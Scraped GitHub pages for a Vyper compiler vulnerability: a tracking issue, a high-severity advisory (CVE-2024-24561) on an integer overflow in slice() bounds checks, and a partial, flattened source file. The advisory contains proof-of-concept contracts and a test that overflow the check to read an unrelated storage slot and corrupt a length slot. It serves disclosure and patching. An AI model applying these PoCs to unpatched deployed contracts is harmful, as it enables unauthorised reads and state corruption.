=== Content from github.com_cce43118_20250114_234328.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fissues%2F3756)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fissues%2F3756)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=vyperlang%2Fvyper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vyperlang](/vyperlang)
/
**[vyper](/vyperlang/vyper)**
Public

* [Notifications](/login?return_to=%2Fvyperlang%2Fvyper) You must be signed in to change notification settings
* [Fork
  818](/login?return_to=%2Fvyperlang%2Fvyper)
* [Star
   5k](/login?return_to=%2Fvyperlang%2Fvyper)

* [Code](/vyperlang/vyper)
* [Issues
  407](/vyperlang/vyper/issues)
* [Pull requests
  82](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects
  0](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

Additional navigation options

* [Code](/vyperlang/vyper)
* [Issues](/vyperlang/vyper/issues)
* [Pull requests](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fvyperlang%2Fvyper%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fvyperlang%2Fvyper%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# invalid bounds check for `slice()` #3756

Closed

[charles-cooper](/charles-cooper) opened this issue
Jan 31, 2024
· 0 comments
 · Fixed by [#3818](https://github.com/vyperlang/vyper/pull/3818)

Closed

# [invalid bounds check for `slice()`](#top) #3756

[charles-cooper](/charles-cooper) opened this issue
Jan 31, 2024
· 0 comments
 · Fixed by [#3818](https://github.com/vyperlang/vyper/pull/3818)

Labels
[bug - codegen](/vyperlang/vyper/labels/bug%20-%20codegen)
[priority - HIGH](/vyperlang/vyper/labels/priority%20-%20HIGH)

## Comments

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=80&u=8126b3c609b132f8625faae11480d2f8113f5acb&v=4)](/charles-cooper)

Copy link

Member

### **[charles-cooper](/charles-cooper)** commented [Jan 31, 2024](#issue-2111140861)

| tracking issue for [GHSA-9x7f-gwxq-6f2c](https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c "GHSA-9x7f-gwxq-6f2c") |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=40&u=8126b3c609b132f8625faae11480d2f8113f5acb&v=4)](/charles-cooper)
[charles-cooper](/charles-cooper)
added
[priority - HIGH](/vyperlang/vyper/labels/priority%20-%20HIGH)
[bug - codegen](/vyperlang/vyper/labels/bug%20-%20codegen)
labels
[Feb 1, 2024](#event-11662743434)

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=40&u=8126b3c609b132f8625faae11480d2f8113f5acb&v=4)](/charles-cooper)
[charles-cooper](/charles-cooper)
mentioned this issue
[Feb 10, 2024](#ref-issue-2128514802)

[meta: 0.4.0 checklist
#3767](/vyperlang/vyper/issues/3767)

Closed

33 tasks

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=40&u=8126b3c609b132f8625faae11480d2f8113f5acb&v=4)](/charles-cooper)
[charles-cooper](/charles-cooper)
mentioned this issue
[Feb 26, 2024](#ref-pullrequest-2154607987)

[fix[codegen]: overflow check in `slice()`
#3818](/vyperlang/vyper/pull/3818)
 Merged

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=40&u=8126b3c609b132f8625faae11480d2f8113f5acb&v=4)](/charles-cooper)
[charles-cooper](/charles-cooper)
closed this as [completed](/vyperlang/vyper/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#3818](/vyperlang/vyper/pull/3818)
[Mar 21, 2024](#event-12207422599)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fissues%2F3756)

Assignees

No one assigned

Labels

[bug - codegen](/vyperlang/vyper/labels/bug%20-%20codegen)
[priority - HIGH](/vyperlang/vyper/labels/priority%20-%20HIGH)

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [fix[codegen]: overflow check in `slice()`](/vyperlang/vyper/pull/3818)
 [charles-cooper/vyper](/charles-cooper/vyper)

1 participant

[![@charles-cooper](https://avatars.githubusercontent.com/u/3867501?s=52&v=4)](/charles-cooper)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2949d683_20250114_234330.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fsecurity%2Fadvisories%2FGHSA-9x7f-gwxq-6f2c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fsecurity%2Fadvisories%2FGHSA-9x7f-gwxq-6f2c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=vyperlang%2Fvyper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vyperlang](/vyperlang)
/
**[vyper](/vyperlang/vyper)**
Public

* [Notifications](/login?return_to=%2Fvyperlang%2Fvyper) You must be signed in to change notification settings
* [Fork
  818](/login?return_to=%2Fvyperlang%2Fvyper)
* [Star
   5k](/login?return_to=%2Fvyperlang%2Fvyper)

* [Code](/vyperlang/vyper)
* [Issues
  407](/vyperlang/vyper/issues)
* [Pull requests
  82](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects
  0](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

Additional navigation options

* [Code](/vyperlang/vyper)
* [Issues](/vyperlang/vyper/issues)
* [Pull requests](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

# Bounds check on built-in `slice()` function can be overflowed

High

[charles-cooper](/charles-cooper)
published
GHSA-9x7f-gwxq-6f2c
Jan 31, 2024

## Package

pip

vyper
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<=0.3.10

## Patched versions

0.4.0

## Description

## Summary

[The bounds check for slices](https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457) does not account for the ability for `start + length` to overflow when the values aren't literals.

If a `slice()` function uses a non-literal argument for the `start` or `length` variable, this creates the ability for an attacker to overflow the bounds check.

This issue can be used to do OOB access to storage, memory or calldata addresses. It can also be used to corrupt the `length` slot of the respective array.

A contract search was performed and no vulnerable contracts were found in production.

tracking in issue [#3756](https://github.com/vyperlang/vyper/issues/3756).

patched in [#3818](https://github.com/vyperlang/vyper/pull/3818).

## Details

Here the flow for `storage` is supposed, but it is generalizable also for the other locations.

When calling `slice()` on a storage value, there are compile time bounds checks if the `start` and `length` values are literals, but of course this cannot happen if they are passed values:

```
if not is_adhoc_slice:
    if length_literal is not None:
        if length_literal < 1:
            raise ArgumentException("Length cannot be less than 1", length_expr)

        if length_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", length_expr)

    if start_literal is not None:
        if start_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", start_expr)
        if length_literal is not None and start_literal + length_literal > arg_type.length:
            raise ArgumentException(f"slice out of bounds for {arg_type}", node)
```

At runtime, we perform the following equivalent check, but the runtime check does not account for overflows:

```
["assert", ["le", ["add", start, length], src_len]],  # bounds check
```

The storage `slice()` function copies bytes directly from storage into memory and returns the memory value of the resulting slice. This means that, if a user is able to input the `start` or `length` value, they can force an overflow and access an unrelated storage slot.

In most cases, this will mean they have the ability to forcibly return `0` for the slice, even if this shouldn't be possible. In extreme cases, it will mean they can return another unrelated value from storage.

## POC: OOB access

For simplicity, take the following Vyper contract, which takes an argument to determine where in a `Bytes[64]` bytestring should be sliced. It should only accept a value of zero, and should revert in all other cases.

```
# @version ^0.3.9

x: public(Bytes[64])
secret: uint256

@external
def __init__():
    self.x = empty(Bytes[64])
    self.secret = 42

@external
def slice_it(start: uint256) -> Bytes[64]:
    return slice(self.x, start, 64)
```

We can use the following manual storage to demonstrate the vulnerability:

```
{"x": {"type": "bytes32", "slot": 0}, "secret": {"type": "uint256", "slot": 3618502788666131106986593281521497120414687020801267626233049500247285301248}}
```

If we run the following test, passing `max - 63` as the `start` value, we will overflow the bounds check, but access the storage slot at `1 + (2**256 - 63) / 32`, which is what was set in the above storage layout:

```
function test__slice_error() public {
    c = SuperContract(deployer.deploy_with_custom_storage("src/loose/", "slice_error", "slice_error_storage"));
    bytes memory result = c.slice_it(115792089237316195423570985008687907853269984665640564039457584007913129639872); // max - 63
    console.logBytes(result);
}
```

The result is that we return the secret value from storage:

```
Logs:
0x0000...00002a

```
## POC: `length` corruption

`OOG` exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the `length` slot is set with the original input value.

```
d: public(Bytes[256])

@external
def test():
	x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1
	self.d = b"\x01\x02\x03\x04\x05\x06"
	# s : Bytes[256] = slice(self.d, 1, x)
	assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935
```

The corruption of `length` can be then used to read dirty memory:

```
@external
def test():
    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1
    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232
    z: uint96 = 1
    if True:
        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]
    s :String[32] = slice(uint2str(z), 1, x)	# uint2str(z) == "1"
    #print(len(s))
    assert slice(s, 1, 2) == "22"
```
## Impact

The built-in `slice()` method can be used for OOB accesses or the corruption of the `length` slot.

### Severity

High

### CVE ID

CVE-2024-24561

### Weaknesses

No CWEs

### Credits

* [![@zobront](https://avatars.githubusercontent.com/u/5749292?s=40&v=4)](/zobront)
  [zobront](/zobront)
  Reporter
* [![@kuroi8](https://avatars.githubusercontent.com/u/146698017?s=40&v=4)](/kuroi8)
  [kuroi8](/kuroi8)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c8ed26ca_20250114_234326.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fblob%2Fb01cd686aa567b32498fefd76bd96b0597c6f099%2Fvyper%2Fbuiltins%2Ffunctions.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvyperlang%2Fvyper%2Fblob%2Fb01cd686aa567b32498fefd76bd96b0597c6f099%2Fvyper%2Fbuiltins%2Ffunctions.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=vyperlang%2Fvyper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vyperlang](/vyperlang)
/
**[vyper](/vyperlang/vyper)**
Public

* [Notifications](/login?return_to=%2Fvyperlang%2Fvyper) You must be signed in to change notification settings
* [Fork
  818](/login?return_to=%2Fvyperlang%2Fvyper)
* [Star
   5k](/login?return_to=%2Fvyperlang%2Fvyper)

* [Code](/vyperlang/vyper)
* [Issues
  407](/vyperlang/vyper/issues)
* [Pull requests
  82](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects
  0](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

Additional navigation options

* [Code](/vyperlang/vyper)
* [Issues](/vyperlang/vyper/issues)
* [Pull requests](/vyperlang/vyper/pulls)
* [Discussions](/vyperlang/vyper/discussions)
* [Actions](/vyperlang/vyper/actions)
* [Projects](/vyperlang/vyper/projects)
* [Wiki](/vyperlang/vyper/wiki)
* [Security](/vyperlang/vyper/security)
* [Insights](/vyperlang/vyper/pulse)

## Files

 b01cd68
## Breadcrumbs

1. [vyper](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099)
2. /[vyper](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper)
3. /[builtins](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins)
/
# functions.py

Copy path Blame  Blame
## Latest commit

## History

[History](/vyperlang/vyper/commits/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py)2688 lines (2168 loc) · 90.1 KB b01cd68
## Breadcrumbs

1. [vyper](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099)
2. /[vyper](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper)
3. /[builtins](/vyperlang/vyper/tree/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins)
/
# functions.py

Top
## File metadata and controls

* Code
* Blame

2688 lines (2168 loc) · 90.1 KB[Raw](https://github.com/vyperlang/vyper/raw/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000import hashlibimport mathimport operatorfrom decimal import Decimal
from vyper import ast as vy\_astfrom vyper.abi\_types import ABI\_Tuplefrom vyper.ast.validation import validate\_call\_argsfrom vyper.codegen.abi\_encoder import abi\_encodefrom vyper.codegen.context import Context, VariableRecordfrom vyper.codegen.core import ( STORE, IRnode, \_freshname, add\_ofst, bytes\_data\_ptr, calculate\_type\_for\_external\_return, check\_external\_call, clamp, clamp2, clamp\_basetype, clamp\_nonzero, copy\_bytes, dummy\_node\_for\_type, ensure\_in\_memory, eval\_once\_check, eval\_seq, get\_bytearray\_length, get\_type\_for\_exact\_size, ir\_tuple\_from\_args, make\_setter, promote\_signed\_int, sar, shl, shr, unwrap\_location,)from vyper.codegen.expr import Exprfrom vyper.codegen.ir\_node import Encoding, scope\_multifrom vyper.codegen.keccak256\_helper import keccak256\_helperfrom vyper.evm.address\_space import MEMORY, STORAGEfrom vyper.exceptions import ( ArgumentException, CompilerPanic, InvalidLiteral, InvalidType, OverflowException, StateAccessViolation, StructureException, TypeMismatch, UnfoldableNode, ZeroDivisionException,)from vyper.semantics.analysis.base import VarInfofrom vyper.semantics.analysis.utils import ( get\_common\_types, get\_exact\_type\_from\_node, get\_possible\_types\_from\_node, validate\_expected\_type,)from vyper.semantics.types import ( TYPE\_T, AddressT, BoolT, BytesM\_T, BytesT, DArrayT, DecimalT, HashMapT, IntegerT, KwargSettings, SArrayT, StringT, TupleT,)from vyper.semantics.types.bytestrings import \_BytestringTfrom vyper.semantics.types.shortcuts import ( BYTES4\_T, BYTES32\_T, INT128\_T, INT256\_T, UINT8\_T, UINT256\_T,)from vyper.semantics.types.utils import type\_from\_annotationfrom vyper.utils import ( DECIMAL\_DIVISOR, EIP\_170\_LIMIT, SHA3\_PER\_WORD, MemoryPositions, SizeLimits, bytes\_to\_int, ceil32, fourbytes\_to\_int, keccak256, method\_id\_int, vyper\_warn,)
from .\_convert import convertfrom .\_signatures import BuiltinFunction, process\_inputs
SHA256\_ADDRESS = 2SHA256\_BASE\_GAS = 60SHA256\_PER\_WORD\_GAS = 12
class FoldedFunction(BuiltinFunction): # Base class for nodes which should always be folded
 # Since foldable builtin functions are not folded before semantics validation, # this flag is used for `check\_kwargable` in semantics validation. \_kwargable = True
class TypenameFoldedFunction(FoldedFunction): # Base class for builtin functions that: # (1) take a typename as the only argument; and # (2) should always be folded.
 # "TYPE\_DEFINITION" is a placeholder value for a type definition string, and # will be replaced by a `TypeTypeDefinition` object in `infer\_arg\_types`. \_inputs = [("typename", "TYPE\_DEFINITION")]
 def fetch\_call\_return(self, node): type\_ = self.infer\_arg\_types(node)[0].typedef return type\_
 def infer\_arg\_types(self, node): validate\_call\_args(node, 1) input\_typedef = TYPE\_T(type\_from\_annotation(node.args[0])) return [input\_typedef]
class Floor(BuiltinFunction): \_id = "floor" \_inputs = [("value", DecimalT())] # TODO: maybe use int136? \_return\_type = INT256\_T
 def evaluate(self, node): validate\_call\_args(node, 1) if not isinstance(node.args[0], vy\_ast.Decimal): raise UnfoldableNode
 value = math.floor(node.args[0].value) return vy\_ast.Int.from\_node(node, value=value)
 @process\_inputs def build\_IR(self, expr, args, kwargs, context): arg = args[0] with arg.cache\_when\_complex("arg") as (b1, arg): ret = IRnode.from\_list( [ "if", ["slt", arg, 0], ["sdiv", ["sub", arg, DECIMAL\_DIVISOR - 1], DECIMAL\_DIVISOR], ["sdiv", arg, DECIMAL\_DIVISOR], ], typ=INT256\_T, ) return b1.resolve(ret)
class Ceil(BuiltinFunction): \_id = "ceil" \_inputs = [("value", DecimalT())] # TODO: maybe use int136? \_return\_type = INT256\_T
 def evaluate(self, node): validate\_call\_args(node, 1) if not isinstance(node.args[0], vy\_ast.Decimal): raise UnfoldableNode
 value = math.ceil(node.args[0].value) return vy\_ast.Int.from\_node(node, value=value)
